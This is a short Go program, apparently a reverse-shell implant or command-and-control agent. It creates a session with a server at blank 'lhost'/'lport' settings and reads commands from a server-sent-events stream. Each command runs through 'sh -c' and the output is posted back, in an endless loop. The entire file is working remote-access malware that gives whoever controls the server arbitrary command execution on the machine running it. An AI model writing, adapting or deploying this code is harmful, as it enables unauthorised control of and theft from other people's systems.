package main

import (
	"crypto/rand"
	b32 "encoding/base32"
	"fmt"
	"net/http"
	"net/url"
	"bufio"
	"strings"
	"os/exec"
)

var lhost = ""
var lport = ""

func generateSessionId() (string, error) {
	bytes := make([]byte, 32)
	_, err := rand.Read(bytes)
	if err != nil {
		return "", err
	}
	return b32.StdEncoding.EncodeToString(bytes)[:32], nil
}

func listenSSE(serverAddr string, sessionID string) {
    resp, err := http.Get("http://" + serverAddr + "/agent/input/" + sessionID)
    if err != nil {
        return
    }
    defer resp.Body.Close()

    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        line := scanner.Text()

        if !strings.HasPrefix(line, "data: ") {
            continue
        }

        payload := strings.TrimPrefix(line, "data: ")
		output, err := process(payload)
		resp, err := http.PostForm("http://"+serverAddr+"/agent/response/"+sessionID, url.Values{"output": {output}})
		resp.Body.Close()
		_ = err
    }
}

func process(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output[:]), nil
}

func main() {
	serverAddr := lhost + ":" + lport

	sessionID, err := generateSessionId()
	if err != nil {
		return
	}

	resp, err := http.PostForm("http://"+serverAddr+"/createSession", url.Values{"sid": {sessionID}, "type": {"1"}})
	if err != nil {
		fmt.Println(err)
	}
	resp.Body.Close()

	for {
		listenSSE(serverAddr, sessionID)
	}
}
